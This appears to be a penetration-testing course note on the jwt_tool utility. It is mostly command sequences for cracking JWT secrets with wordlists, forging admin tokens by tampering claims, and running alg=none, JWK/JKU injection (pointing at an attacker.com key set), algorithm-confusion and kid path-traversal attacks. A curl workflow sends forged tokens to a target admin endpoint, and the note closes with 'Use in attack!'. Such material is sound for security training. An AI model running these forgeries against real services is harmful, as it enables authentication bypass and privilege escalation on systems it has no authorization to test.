---
tags: [vapt, jwt, intermediate]
difficulty: intermediate
module: "18 - JWT"
topic: "18.14 JWT Cracking with jwt_tool"
---

# 18.14 — JWT Cracking with jwt_tool

## jwt_tool Overview

```
JWT_TOOL:
  GitHub: https://github.com/ticarpi/jwt_tool
  Author: ticarpi
  
  CAPABILITIES:
  - Decode and inspect JWTs
  - Tamper payloads
  - Test multiple attacks automatically
  - Crack HS256/384/512 secrets
  - Exploit: alg=none, algorithm confusion, jwk/jku injection, kid injection
  - Run against live endpoints (test if attack succeeds)
```

---

## Installation

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
pip3 install -r requirements.txt
chmod +x jwt_tool.py

# TEST INSTALLATION:
python3 jwt_tool.py --help
```

---

## Basic Usage: Decode and Inspect

```bash
TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjEsInJvbGUiOiJ1c2VyIn0.SIGNATURE"

# DECODE TOKEN:
python3 jwt_tool.py $TOKEN

# OUTPUT:
# =====================
# Decoded Token Values:
# =====================
# Token header values:
# [+] alg = "HS256"
# [+] typ = "JWT"
# 
# Token payload values:
# [+] userId = 1
# [+] role = "user"
# 
# Signature is VALID (or not yet verified)
```

---

## Cracking Mode

```bash
# CRACK HS256 SECRET:
python3 jwt_tool.py $TOKEN -C -d /usr/share/seclists/Passwords/rockyou.txt

# -C = crack mode
# -d = dictionary file

# USE BUILT-IN SECRET LIST (jwt-common.txt in jwt_tool dir):
python3 jwt_tool.py $TOKEN -C -d jwt-common.txt

# TARGETED CRACK (company name, app name, etc.):
cat > targeted.txt << 'EOF'
secret
password
myapp
companyname
jwt
jwtkey
SECRETKEY
prod_secret
devkey
supersecret
EOF

python3 jwt_tool.py $TOKEN -C -d targeted.txt

# SUCCESSFUL CRACK OUTPUT:
# [+] Found secret! "secret"
# Use -p "secret" to sign new tokens
```

---

## Tampering Mode

```bash
# TAMPER PAYLOAD INTERACTIVELY:
python3 jwt_tool.py $TOKEN -T
# → Shows current claims → asks for new values
# → Re-signs if you provide the secret with -S

# TAMPER + SIGN WITH KNOWN SECRET:
python3 jwt_tool.py $TOKEN -T -S hs256 -p "found_secret"
# → Prompts to change each claim → signs with "found_secret"

# TAMPER SPECIFIC CLAIM DIRECTLY:
python3 jwt_tool.py $TOKEN -I -pc role -pv admin -S hs256 -p "found_secret"
# -I = inject mode (don't prompt, inject directly)
# -pc = payload claim to modify
# -pv = new value for that claim
```

---

## Exploit Modes

```bash
# ALGORITHM NONE:
python3 jwt_tool.py $TOKEN -X a
# -X a = algorithm none

# ALGORITHM NONE + TAMPER:
python3 jwt_tool.py $TOKEN -X a -T
# Combined: exploit none + change payload

# JWK INJECTION:
python3 jwt_tool.py $TOKEN -X i
# -X i = inject malicious jwk (auto-generates key)

# JKU INJECTION:
python3 jwt_tool.py $TOKEN -X s -ju http://attacker.com/evil-jwks.json
# -X s = jku injection, -ju = URL

# ALGORITHM CONFUSION (HS256 with RSA public key):
python3 jwt_tool.py $TOKEN -X k -pk public_key.pem
# -X k = alg confusion, -pk = path to public key

# KID PATH TRAVERSAL:
python3 jwt_tool.py $TOKEN -I -hc kid -hv '../../../dev/null' -S hs256 -p ''
# -hc = header claim, -hv = header value

# TEST ALL ATTACKS AT ONCE:
python3 jwt_tool.py $TOKEN -t https://target.com/api/admin \
  -rh "Authorization: Bearer JWT" \
  -X all
# -t = target URL to test against, -rh = request header name
# -X all = try all exploit modes
```

---

## Testing Against Live Endpoints

```bash
# SCAN FOR JWT VULNERABILITIES ON ENDPOINT:
python3 jwt_tool.py $TOKEN \
  -t https://target.com/api/admin \
  -rh "Authorization: Bearer JWT" \
  -M pb  # playbook mode (try all techniques)

# VERIFY SPECIFIC ATTACK WORKS:
# 1. Generate forged token with -X a:
FORGED=$(python3 jwt_tool.py $TOKEN -X a -I -pc role -pv admin 2>/dev/null | tail -1)

# 2. Test against endpoint:
curl https://target.com/api/admin \
  -H "Authorization: Bearer $FORGED" \
  -v

# CHECK RESPONSE:
# 200 = attack successful!
# 401/403 = server properly validates
```

---

## jwt_tool Workflow Summary

```
STEP 1: Capture JWT from traffic
  → Burp → HTTP History → search for "eyJ" → copy token

STEP 2: Decode and analyze:
  python3 jwt_tool.py TOKEN
  → Note: alg, claims, any jwk/jku/kid in header

STEP 3: Choose attacks based on alg:
  If alg = HS256/HS384/HS512:
    → Try crack: -C -d rockyou.txt
    → Try alg=none: -X a
    
  If alg = RS256/RS384/RS512:
    → Try alg confusion: -X k -pk public.pem
    → Try jwk injection: -X i
    → Try jku injection: -X s -ju http://attacker.com/jwks
    
  For any token:
    → Test against endpoint: -X all

STEP 4: If successful:
  → Tamper payload: change role, userId, etc.
  → Sign with discovered method
  → Use in attack!
```

---

## Related Notes
- [[04 - Algorithm None Attack]] — theory behind -X a
- [[05 - RS256 to HS256 Algorithm Confusion]] — theory behind -X k
- [[06 - Weak Secret Brute Force]] — crack mode theory
- [[07 - JWT Header Injection jwk claim]] — theory behind -X i
- [[15 - JWT Cracking with hashcat]] — alternative cracking tool
